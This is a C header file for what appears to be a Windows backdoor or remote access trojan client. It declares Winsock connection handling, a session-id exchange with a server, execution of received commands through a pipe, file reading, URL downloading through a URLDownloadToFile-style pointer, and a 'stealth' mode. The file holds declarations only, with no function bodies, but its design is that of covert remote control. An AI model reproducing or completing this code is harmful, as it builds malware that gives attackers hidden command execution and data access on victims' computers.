/*       _ _       _
 *  _ __| | | _ __/ |
 * | '_ \_  _| '_\  |
 * | .__/ |_|| .__/_|
 * |_|       |_|
 *
 * Header file.
 *
 ******/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define str(a) #a
#define xstr(a) str(a)
#define BUFSIZE 9999

typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);

typedef struct {

	FILE * pPipe;

	int portno;
	char ip[16];
	char buf[BUFSIZE];

	SOCKET s;
	WSADATA wsa;

	struct sockaddr_in client;

} fileWrapper;

char wrecvsid(int sock, int size, int *br);		// function to receive session id
char incr(char ch);					// increment by 1 char
char decr(char ch);					// decrement by 1 char
int iscommand(char buf);				// determine if it is a command or not
int download(char * url);				// download function
int sendui(int s, char uin, int * bs);			// send the user interface
int sendprompt(SOCKET s, char uin);			// send prompt
int setupvar(fileWrapper * file);			// setup variables at begining
int sendbuf(SOCKET s, char * buf, int size);		// send buffer to server
int processdata(SOCKET s, char cmd, char cmd2);		// process the received data
void change_dir(char * dir);				// change current directory
int cat_file(char * f, char * pbuf);			// read file
void stealth();						// stealth mode
int main_loop(fileWrapper * file);			// main function
int executeCommand(fileWrapper * file);			// executing the buf function
void connected(fileWrapper * file, int * cn);		// connect to the server
